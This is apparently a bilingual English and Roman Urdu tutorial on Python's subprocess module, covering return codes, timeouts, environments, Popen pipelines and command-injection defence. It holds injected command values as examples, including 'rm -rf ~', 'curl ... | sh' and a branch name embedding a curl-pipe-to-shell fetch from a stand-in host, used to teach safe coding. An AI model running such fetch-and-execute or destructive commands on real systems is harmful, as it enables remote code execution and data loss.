<BigIdea>
<Tr>
<En>
Many automation tasks are best done by running programs that already exist: `git` to inspect a repository, `docker` to build an image, `kubectl` to check pods, `pg_dump` to back up a database. The **`subprocess`** module starts such a program as a **child process** and lets your script wait for it, read what it printed and see whether it succeeded. The workhorse is **`subprocess.run(["git", "status", "--short"], capture_output=True, text=True)`**. Pass the command as a **list**: the program name followed by each argument as its own string. `capture_output=True` collects **stdout** and **stderr**, `text=True` decodes them to strings, and the result's **`returncode`** tells you what happened (0 means success). A failing command does **not** raise by default, so add **`check=True`** to get a `CalledProcessError`, and always set a **`timeout`** so a hung command can't block your script forever. A missing program raises `FileNotFoundError`. You can pass **input**, run in another folder with **`cwd`**, and control the child's **environment** with `env`. The biggest danger is **`shell=True`** with any outside data: the string is interpreted by a shell, so a value like `report.txt; rm -rf ~` runs a second command. That's **command injection**. Use lists and no shell; if you truly need shell features, quote every value with `shlex.quote`. For pipelines and live output, `subprocess.Popen` gives you lower-level control.
</En>
<Ur>
Kai automation ke kaam pehle se mojood programs chala kar behtareen hote hain: repository dekhne ke liye `git`, image banane ke liye `docker`, pods check karne ke liye `kubectl`, database backup ke liye `pg_dump`. **`subprocess`** module aisa program **child process** ke taur par shuru karta aur aap ki script ko us ka intezar karne, us ka print kiya parhne aur kamyabi dekhne deta hai. Asal kaam ka ghora **`subprocess.run(["git", "status", "--short"], capture_output=True, text=True)`** hai. Command **list** ki shakal me dein: program ka naam aur har argument apni alag string. `capture_output=True` **stdout** aur **stderr** jama karta, `text=True` unhe strings me decode karta, aur natije ka **`returncode`** batata hai kya hua (0 matlab kamyabi). Nakam command default me error **nahi** uthati, isliye `CalledProcessError` ke liye **`check=True`** jorein, aur hamesha **`timeout`** lagayen taa ke atki command aap ki script hamesha ke liye na rok sake. Ghayab program `FileNotFoundError` uthata hai. Aap **input** de sakte, **`cwd`** se doosre folder me chala sakte, aur `env` se child ka **environment** qaboo kar sakte hain. Sab se bara khatra bahar ke kisi bhi data ke saath **`shell=True`** hai: string shell parhta hai, isliye `report.txt; rm -rf ~` jaisi value doosri command chala deti hai. Ye **command injection** hai. Lists lein aur shell nahi; agar sach me shell ki khoobiyan chahiye to har value `shlex.quote` se quote karein. Pipelines aur live output ke liye `subprocess.Popen` zyada qaboo deta hai.

## Picture it

<Tr>
<En>

Think of **handing a job to a contractor**.

- The list form is a written work order with each instruction in its own box: "cat", "report.txt; touch PWNED". The contractor does exactly that and treats the odd file name as a file name.
- `shell=True` is reading the work order out loud to a foreman who interprets it. If the order contains "...; also knock down the wall", the foreman does that too.
- `capture_output` is asking for the contractor's report (stdout) and complaints (stderr); `returncode` is whether they say the job succeeded.
- `timeout` is "if you're not done by 5 pm, stop": without it, a stuck contractor keeps you waiting forever.

</En>
<Ur>

**Contractor ko kaam saunpna** socheyn.

- List ki shakal likha hua work order hai jis me har hidayat apne khaane me hai: "cat", "report.txt; touch PWNED". Contractor bilkul wahi karta aur ajeeb file ke naam ko file ka naam hi samajhta hai.
- `shell=True` work order ko zor se aise foreman ko parh kar sunana hai jo uski tashreeh karta hai. Agar order me "...; saath me deewar bhi gira do" ho, to foreman woh bhi kar deta hai.
- `capture_output` contractor ki report (stdout) aur shikayaten (stderr) maangna hai; `returncode` ye ke woh kehte hain kaam kamyab hua ya nahi.
- `timeout` "5 baje tak khatam na ho to ruk jao" hai: is ke baghair atka contractor aap ko hamesha intezar karwata hai.

</Ur>

## Learn it step by step

<Walkthrough>

<Step title="run, return codes, check, errors, timeouts, input, cwd and env">

<Tr>
<En>
`run_basics.py` runs `git --version` and reads its output, runs `ls` on a missing folder with and without `check=True`, tries a misspelled program, kills a command that runs too long, pipes text into `sort`, runs `pwd` in another folder, and starts a child Python with a minimal, explicit environment. (Error messages from `ls` look slightly different on macOS.)
</En>
<Ur>
`run_basics.py` `git --version` chala kar us ka output parhti, `check=True` ke saath aur baghair ghayab folder par `ls` chalati, ghalat spelling wala program aazmati, zyada der chalne wali command khatam karti, `sort` me text pipe karti, doosre folder me `pwd` chalati, aur kam se kam, wazeh environment ke saath child Python shuru karti hai. (macOS par `ls` ke error paighamat thore mukhtalif dikhte hain.)
</Ur>
</Tr>

```bash
cat > run_basics.py <<'EOF'
import subprocess, sys

# 1. Run a command, capture its output as text
r = subprocess.run(["git", "--version"], capture_output=True, text=True)
print("returncode:", r.returncode, "| stdout starts with:", r.stdout.split()[0:2])

# 2. Non-zero exit codes do NOT raise by default...
r = subprocess.run(["ls", "no-such-dir"], capture_output=True, text=True)
print("returncode:", r.returncode, "| stderr:", r.stderr.strip())

# ...unless you pass check=True
try:
    subprocess.run(["ls", "no-such-dir"], capture_output=True, text=True, check=True)
except subprocess.CalledProcessError as e:
    print(f"CalledProcessError: exit {e.returncode}, cmd={e.cmd}")

# 3. A missing program is a different error
try:
    subprocess.run(["terraformm", "plan"])
except FileNotFoundError as e:
    print("FileNotFoundError:", e.filename)

# 4. Timeouts kill commands that hang
try:
    subprocess.run([sys.executable, "-c", "import time; time.sleep(10)"], timeout=0.5)
except subprocess.TimeoutExpired as e:
    print(f"TimeoutExpired after {e.timeout}s")

# 5. Input, working directory and environment
r = subprocess.run(["sort", "-r"], input="web01\ndb01\ncache01\n", capture_output=True, text=True, check=True)
print("sorted:", r.stdout.split())
r = subprocess.run(["pwd"], cwd="/tmp", capture_output=True, text=True, check=True)
print("ran in:", r.stdout.strip())
env = {"PATH": "/usr/bin:/bin", "APP_ENV": "staging"}          # a minimal, explicit environment
r = subprocess.run([sys.executable, "-c", "import os; print(os.environ.get('APP_ENV'), 'HOME' in os.environ)"],
                   env=env, capture_output=True, text=True, check=True)
print("child sees:", r.stdout.strip())
EOF
python3 run_basics.py
```

```text output
returncode: 0 | stdout starts with: ['git', 'version']
returncode: 2 | stderr: ls: cannot access 'no-such-dir': No such file or directory
CalledProcessError: exit 2, cmd=['ls', 'no-such-dir']
FileNotFoundError: terraformm
TimeoutExpired after 0.5s
sorted: ['web01', 'db01', 'cache01']
ran in: /tmp
child sees: staging False
```

<Happened>
<Tr>
<En>

- `capture_output=True, text=True` gave us `r.stdout` as a string we could split; **returncode 0** means success.
- `ls no-such-dir` exited with **2** and wrote its complaint to **stderr**, but `run` did **not** raise: without `check=True`, a script would carry on as if everything worked. With `check=True` we got **CalledProcessError** carrying the exit code and the command.
- The misspelled `terraformm` raised **FileNotFoundError**: the program couldn't even start. That's a different failure from "started and failed", so handle both.
- `timeout=0.5` killed the sleeping child and raised **TimeoutExpired**. Every external command in automation needs a timeout.
- `input=` fed lines to `sort -r`, `cwd="/tmp"` ran `pwd` there without changing our own directory, and `env={...}` gave the child **only** PATH and APP_ENV, so it saw `staging` and **no HOME**. To add a variable while keeping the rest, pass `{**os.environ, "APP_ENV": "staging"}`. Passing a minimal environment is a good way to avoid leaking secrets to tools that don't need them.

</En>
<Ur>

- `capture_output=True, text=True` ne `r.stdout` string ki shakal me diya jise hum tor sakte the; **returncode 0** matlab kamyabi.
- `ls no-such-dir` **2** ke saath nikla aur apni shikayat **stderr** par likhi, magar `run` ne error **nahi** uthaya: `check=True` ke baghair script aise jaari rehti jaise sab theek chala. `check=True` ke saath humein exit code aur command wala **CalledProcessError** mila.
- Ghalat spelling wale `terraformm` ne **FileNotFoundError** uthaya: program shuru bhi nahi ho saka. Ye "shuru ho kar nakam" se mukhtalif nakami hai, isliye dono sambhalein.
- `timeout=0.5` ne sote child ko khatam kiya aur **TimeoutExpired** uthaya. Automation ki har bahari command ko timeout chahiye.
- `input=` ne `sort -r` ko lines din, `cwd="/tmp"` ne apna folder badle baghair wahan `pwd` chalaya, aur `env={...}` ne child ko **sirf** PATH aur APP_ENV diye, isliye usne `staging` dekha aur **HOME nahi**. Baqi rakhte hue variable jorne ke liye `{**os.environ, "APP_ENV": "staging"}` dein. Kam se kam environment dena un tools tak secrets leak hone se bachane ka acha tareeqa hai jinhe unki zaroorat nahi.

</Ur>
</Tr>

<Step title="Command injection, quoting, which, pipelines and streaming">

<Tr>
<En>
`run_safe.py` treats a file name as if it came from a user, `report.txt; touch PWNED`, and runs `cat` on it first with `shell=True` and then with a list. It quotes and splits strings with `shlex`, checks programs with `shutil.which`, connects `printf` to `grep -c` without a shell, and streams the output of a slow command line by line with `Popen`. The injected command only creates an empty file in the demo folder.
</En>
<Ur>
`run_safe.py` file ke naam ko aise samajhti jaise user se aaya ho, `report.txt; touch PWNED`, aur us par pehle `shell=True` aur phir list ke saath `cat` chalati hai. `shlex` se strings quote aur torti, `shutil.which` se programs check karti, shell ke baghair `printf` ko `grep -c` se jorti, aur `Popen` se dheemi command ka output line ba line stream karti hai. Inject hui command demo folder me sirf khaali file banati hai.
</Ur>
</Tr>

```bash
cat > run_safe.py <<'EOF'
import os, shlex, shutil, subprocess, sys

open("report.txt", "w").write("ok\n")
name = "report.txt; touch PWNED"                 # imagine this came from a user or a web form

# DANGEROUS: the string goes through a shell, so ";" starts a second command
subprocess.run(f"cat {name}", shell=True, capture_output=True, text=True)
print("shell=True created PWNED:", os.path.exists("PWNED"))
os.remove("PWNED")

# SAFE: a list is passed straight to the program; the whole name is one argument
r = subprocess.run(["cat", name], capture_output=True, text=True)
print("list form:", r.returncode, "|", r.stderr.strip(), "| PWNED exists:", os.path.exists("PWNED"))

# If you truly need a shell, quote every untrusted value
print("quoted:", shlex.quote(name))
print("split :", shlex.split("git commit -m 'fix login bug'"))

# Find programs before running them
print("which git:", bool(shutil.which("git")), "| which terraformm:", shutil.which("terraformm"))

# A pipeline without a shell: printf | grep -c ERROR
p1 = subprocess.Popen(["printf", "INFO a\nERROR b\nERROR c\n"], stdout=subprocess.PIPE)
p2 = subprocess.Popen(["grep", "-c", "ERROR"], stdin=p1.stdout, stdout=subprocess.PIPE, text=True)
p1.stdout.close()                                # let p1 get SIGPIPE if p2 exits early
print("errors counted by grep:", p2.communicate()[0].strip())

# Stream output line by line from a long-running command
cmd = [sys.executable, "-u", "-c", "import time\nfor i in range(3):\n    print(f'step {i+1}/3'); time.sleep(0.1)"]
with subprocess.Popen(cmd, stdout=subprocess.PIPE, text=True) as proc:
    for line in proc.stdout:
        print("  live:", line.rstrip())
print("exit code:", proc.returncode)
EOF
python3 run_safe.py
```

```text output
shell=True created PWNED: True
list form: 1 | cat: 'report.txt; touch PWNED': No such file or directory | PWNED exists: False
quoted: 'report.txt; touch PWNED'
split : ['git', 'commit', '-m', 'fix login bug']
which git: True | which terraformm: None
errors counted by grep: 2
  live: step 1/3
  live: step 2/3
  live: step 3/3
exit code: 0
```

<Happened>
<Tr>
<En>

- With `shell=True`, the shell saw `cat report.txt; touch PWNED` as **two commands**, and the second one ran: **PWNED was created**. An attacker would use `curl ... | sh` or `rm -rf` instead of `touch`. This is one of the most common vulnerabilities in automation and web backends.
- The list form passed the whole string as **one argument** to `cat`, which simply reported that no file has that strange name (exit 1). Nothing else ran.
- `shlex.quote` wraps a value so a shell treats it as plain text; use it only when you genuinely need a shell. `shlex.split` turns a command string into a correct list, respecting quotes.
- `shutil.which` returned a path for git and **None** for the typo, so you can fail early with a helpful message.
- Two `Popen` objects connected `printf`'s stdout to `grep`'s stdin, the equivalent of `printf ... | grep -c ERROR` with no shell involved. Often it's even simpler to read the output into Python and filter there.
- `Popen` with `stdout=PIPE` let us print each **live** line as the child produced it (the `-u` flag stops Python buffering the child's output), which is what you want for builds, deploys and long migrations.

</En>
<Ur>

- `shell=True` ke saath shell ne `cat report.txt; touch PWNED` ko **do commands** dekha, aur doosri chal gayi: **PWNED ban gayi**. Hamla awar `touch` ke bajaye `curl ... | sh` ya `rm -rf` istemal karega. Ye automation aur web backends ki sab se aam kamzoriyon me se hai.
- List wali shakal ne poori string `cat` ko **ek argument** ke taur par di, jis ne bas bataya ke is ajeeb naam ki koi file nahi (exit 1). Aur kuch nahi chala.
- `shlex.quote` value ko aise lapetta ke shell use saada text samjhe; ise sirf tab lein jab sach me shell chahiye. `shlex.split` quotes ka khayal rakhte hue command string ko durust list banata hai.
- `shutil.which` ne git ke liye path aur ghalat spelling ke liye **None** lautaya, taa ke aap madadgar paigham ke saath jaldi nakam ho sakein.
- Do `Popen` objects ne `printf` ka stdout `grep` ke stdin se jora, baghair shell ke `printf ... | grep -c ERROR` ke barabar. Aksar output Python me parh kar wahin chhaanna aur bhi aasan hai.
- `stdout=PIPE` wale `Popen` ne har **live** line print karne di jaise hi child ne banayi (`-u` flag Python ko child ka output buffer karne se rokta hai), jo builds, deploys aur lambi migrations ke liye chahiye.

</Ur>
</Tr>

## Common mistakes

<Compare>
<Bad title="Shell strings with outside data, no checks">

```text
branch = request.args["branch"]
os.system(f"git checkout {branch}")                       # injection; exit code ignored
subprocess.run(f"docker build -t {tag} .", shell=True)    # same problem
```

</Bad>
<Good title="Lists, check, timeout, validation">

```text
if not re.fullmatch(r"[A-Za-z0-9._/-]{1,100}", branch):
    raise ValueError("invalid branch name")
subprocess.run(["git", "checkout", "--", branch], check=True, timeout=60)
subprocess.run(["docker", "build", "-t", tag, "."], check=True, timeout=1800)
```

</Good>
</Compare>

<Compare>
<Bad title="Ignoring failures and hangs">

```text
out = subprocess.run(["pg_dump", "shop"], capture_output=True).stdout
open("backup.sql", "wb").write(out)          # empty file if pg_dump failed; no timeout
print("backup done")
```

</Bad>
<Good title="Fail loudly">

```text
try:
    r = subprocess.run(["pg_dump", "shop"], capture_output=True, check=True, timeout=3600)
except (subprocess.CalledProcessError, subprocess.TimeoutExpired) as e:
    log.error("backup failed: %s", e)
    raise SystemExit(1)
Path("backup.sql").write_bytes(r.stdout)
```

</Good>
</Compare>

<Tr>
<En>

More mistakes to avoid:

- **Using `os.system` or `os.popen`**: no output capture, poor error handling; use `subprocess`.
- **Passing secrets as command-line arguments** (`mysql -pSECRET`): visible to other users via `ps`; use environment variables or config files with tight permissions.
- **Forgetting `--` before user-supplied values**: a value like `--upload-pack=...` can be read as an option (argument injection).
- **`capture_output` on commands that produce gigabytes**: write to a file with `stdout=f` instead.
- **Assuming a command's output format never changes**: prefer machine-readable flags (`--format json`, `--porcelain`).

</En>
<Ur>

Bachne wali mazeed ghaltiyan:

- **`os.system` ya `os.popen` istemal karna**: output pakarna nahi, kamzor error handling; `subprocess` lein.
- **Secrets command-line arguments ke taur par dena** (`mysql -pSECRET`): `ps` ke zariye doosre users ko nazar aate; environment variables ya sakht permissions wali config files lein.
- **User ki di values se pehle `--` bhoolna**: `--upload-pack=...` jaisi value option samjhi ja sakti hai (argument injection).
- **Gigabytes output dene wali commands par `capture_output`**: is ke bajaye `stdout=f` se file me likhein.
- **Ye samajhna ke command ke output ka format kabhi nahi badlega**: machine ke parhne layak flags (`--format json`, `--porcelain`) ko tarjeeh dein.

</Ur>
</Tr>

import subprocess, sys

def run(name, cmd, timeout=10):
    """Run a command; return (ok, output) instead of raising."""
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, check=True)
        return True, r.stdout.strip()
    except FileNotFoundError:
        return False, f"{cmd[0]}: not installed"
    except subprocess.TimeoutExpired:
        return False, f"{name}: timed out after {timeout}s"
    except subprocess.CalledProcessError as e:
        return False, f"{name}: exit {e.returncode}: {e.stderr.strip()[:60]}"

checks = {
    "python": [sys.executable, "-c", "print('ok')"],
    "missing": ["kubectll", "version"],
    "failing": [sys.executable, "-c", "import sys; sys.exit('config invalid')"],
    "hanging": [sys.executable, "-c", "import time; time.sleep(5)"],
}
for name, cmd in checks.items():
    ok, msg = run(name, cmd, timeout=1)
    print(f"{name:<8} {'PASS' if ok else 'FAIL'}  {msg}")

# python   PASS  ok
# missing  FAIL  kubectll: not installed
# failing  FAIL  failing: exit 1: config invalid
# hanging  FAIL  hanging: timed out after 1s

import subprocess, tempfile
from pathlib import Path

def git(*args, cwd):
    return subprocess.run(["git", *args], cwd=cwd, capture_output=True, text=True, check=True).stdout.strip()

with tempfile.TemporaryDirectory() as repo:
    git("init", "-q", "-b", "main", cwd=repo)
    git("config", "user.email", "jane@example.com", cwd=repo)
    git("config", "user.name", "Jane Cooper", cwd=repo)
    for i, msg in enumerate(["Add README", "Add CI workflow", "Fix login bug"]):
        Path(repo, f"file{i}.txt").write_text(msg)
        git("add", ".", cwd=repo)
        git("commit", "-q", "-m", msg, cwd=repo)
    Path(repo, "notes.txt").write_text("draft")
    print("branch:", git("branch", "--show-current", cwd=repo))
    print("commits:", git("rev-list", "--count", "HEAD", cwd=repo))
    print("last 2:", git("log", "-2", "--format=%s", cwd=repo).splitlines())
    print("uncommitted:", git("status", "--porcelain", cwd=repo).splitlines())

# branch: main
# commits: 3
# last 2: ['Fix login bug', 'Add CI workflow']
# uncommitted: ['?? notes.txt']

<DeepDive title="More about subprocess">

**Async subprocesses.** `asyncio.create_subprocess_exec` runs many commands concurrently without threads.

**Large outputs.** Redirect to files (`stdout=open("out.log", "wb")`) or stream with `Popen` instead of capturing gigabytes in memory.

**Process groups and signals.** `start_new_session=True` and `os.killpg` let you stop a command and all its children; `proc.terminate()` sends SIGTERM, `proc.kill()` SIGKILL.

**Windows differences.** Some commands are shell built-ins on Windows (`dir`); program names may need `.exe`; `shlex` follows POSIX rules.

**Higher-level libraries.** `sh` and `plumbum` offer friendlier syntax; `fabric` and `paramiko` run commands over SSH.

</DeepDive>

<DeepDive title="Real world: the CI job that deployed a branch name">

An internal deploy tool ran `subprocess.run(f"git checkout {branch} && ./deploy.sh", shell=True)` with the branch name taken from a chat command. A tester typed a "branch" containing `$(curl -s https://example.test/x | sh)`. The shell evaluated it, and the script from that URL ran on the deploy server with access to production credentials. Fortunately it was a harmless proof of concept.

The fixes:

1. Lists instead of shell strings, with `--` before the branch argument.
2. Branch names validated against an allow-list pattern and checked with `git rev-parse --verify`.
3. The deploy runner was given the minimum credentials it needed, and its outbound network access was restricted.

</DeepDive>

<DeepDive title="Security lens">

- **Command injection (CWE-78)**: never combine `shell=True` with untrusted data; use argument lists.
- **Argument injection**: values starting with `-` can become options; validate them and put `--` before positional values.
- **Secrets**: pass them via environment or stdin, not arguments visible in `ps`; scrub them from logged commands.
- **Minimal environment**: give child processes only the variables they need.
- **Full paths for sensitive tools** in privileged scripts, so a malicious program earlier on PATH can't be run instead.

</DeepDive>

<DeepDive title="Interview questions">

<QA q="What's the difference between subprocess.run with a list and with shell=True?">
With a list, the program is executed directly and each item is one argument, so special characters have no meaning; with shell=True a shell parses the string, enabling pipes and variables but also command injection if any part is untrusted.
</QA>

<QA q="How do you handle a command that might hang?">
Pass timeout to run or communicate; catch TimeoutExpired, log it and fail or retry, and for process trees consider killing the whole process group.
</QA>

<QA q="What does check=True do?">
It makes run raise CalledProcessError when the command exits with a non-zero status, so failures aren't silently ignored.
</QA>

<QA q="When would you use Popen instead of run?">
When you need to interact with the process while it runs: streaming output, connecting pipelines between processes, sending input incrementally or managing long-lived processes.
</QA>

<QA q="How do you safely pass a secret to a subprocess?">
Through an environment variable or stdin rather than a command-line argument, with a minimal environment, making sure it isn't logged.
</QA>

</DeepDive>
